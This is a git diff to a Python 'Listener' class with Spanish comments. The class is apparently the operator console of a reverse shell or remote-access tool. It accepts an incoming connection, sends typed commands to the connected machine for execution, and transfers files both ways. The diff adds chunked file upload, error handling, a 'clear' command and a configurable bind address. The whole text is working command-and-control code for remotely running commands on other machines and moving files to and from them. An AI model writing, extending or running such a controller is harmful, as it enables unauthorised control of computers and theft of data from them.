@@ -1,3 +1,4 @@
+import subprocess
 import socket
 import json
 import optparse
@@ -21,7 +22,6 @@ class Listener:
         print('Servidor inicializado, esperando por conexiones')
         self.connection, address = listener.accept() #Aceptar conexiones
         print(f'[+]Conexión establecida con {address}\n')
-        self.reliableSend(b'Conexion establecida')
 
     #Es importante mantener una integridad de los datos, 
     #es decir, asegurarnos de que ningún paquete se pierda durante la comunicación
@@ -76,32 +76,49 @@ class Listener:
         # Abrir un nuevo archivo en donde guardar
         # los datos recibidos.
         filename = os.path.basename(filename)
-        with open(f'{route}{filename}', "wb") as f:
-            mensaje = '[+]Archivo descargado con éxito'
-            received_bytes = 0
-            # Recibir los datos del archivo en bloques de
-            # 1024 bytes hasta llegar a la cantidad de
-            # bytes total informada por el cliente.
-            while received_bytes < filesize:
-                chunk = sck.recv(1024)
-                if chunk and not (b'no encononontrado' in chunk):                    
-                    f.write(chunk)
-                    received_bytes += len(chunk)
-                else:
-                    mensaje = '[-]Descarga fallida o archivo no encontrado'
-                    break
-            print(mensaje)
+        try:    
+            with open(f'{route}{filename}', "wb") as f:
+                mensaje = '[+]Archivo descargado con éxito'
+                received_bytes = 0
+                # Recibir los datos del archivo en bloques de
+                # 1024 bytes hasta llegar a la cantidad de
+                # bytes total informada por el cliente.
+                while received_bytes < filesize:
+                    chunk = sck.recv(1024)
+                    if chunk and not (b'no encononontrado' in chunk):                    
+                        f.write(chunk)
+                        received_bytes += len(chunk)
+                    else:
+                        mensaje = '[-]Descarga fallida o archivo no encontrado'
+                        break
+                print(mensaje)
+        except FileNotFoundError:
+            print('[-]Directorio no encontrado')
+
+    def send_file(self, sck: socket.socket, filename):
+        try:
+            # Obtener el tamaño del archivo a enviar.
+            filesize = os.path.getsize(filename)
+            # Informar primero al servidor la cantidad
+            # de bytes que serán enviados.
+            sck.sendall(struct.pack("<Q", filesize))
+            # Enviar el archivo en bloques de 1024 bytes.
+            with open(filename, "rb") as f:
+                while read_bytes := f.read(1024):
+                    sck.sendall(read_bytes)
+        except FileNotFoundError:
+            sck.sendall(b'[-]Archivo no encononontrado')
     
     def remoteAction(self, command):
         self.reliableSend(command)
         if command[0] == 'salir' or command[0] == 'Salir':
             print('Programa finalizado')
             self.connection.close()
-            exit()        
+            exit()
         return self.reliableRecieve()
 
     def run(self):
-            while True:
+            while True:                
                 command = input('>>')
                 command = command.split(' ')                
 
@@ -111,10 +128,14 @@ class Listener:
                     result = ''
 
                 elif command[0] == 'up':
-                    contentFile = self.readFile(' '.join(command[2:]))
                     #command[0]=comando, command[1]=ruta, command[2:]=nombre del archivo
-                    command = [command[0], contentFile.decode('utf-8', 'replace'), command[1], ' '.join(command[2:])]
-                    result = self.remoteAction(command)
+                    self.reliableSend(command)
+                    self.send_file(self.connection, ' '.join(command[2:]))
+                    result = self.reliableRecieve()
+
+                elif command[0] == 'clear':
+                    subprocess.call('clear')
+                    result = ''
 
                 else:
                     result = self.remoteAction(command)
@@ -123,7 +144,7 @@ class Listener:
 
 options = getArguments()
 try:
-    listener = Listener('', int(options.serverPort))
+    listener = Listener(options.serverIp, int(options.serverPort))
     listener.run()
 
 except KeyboardInterrupt:
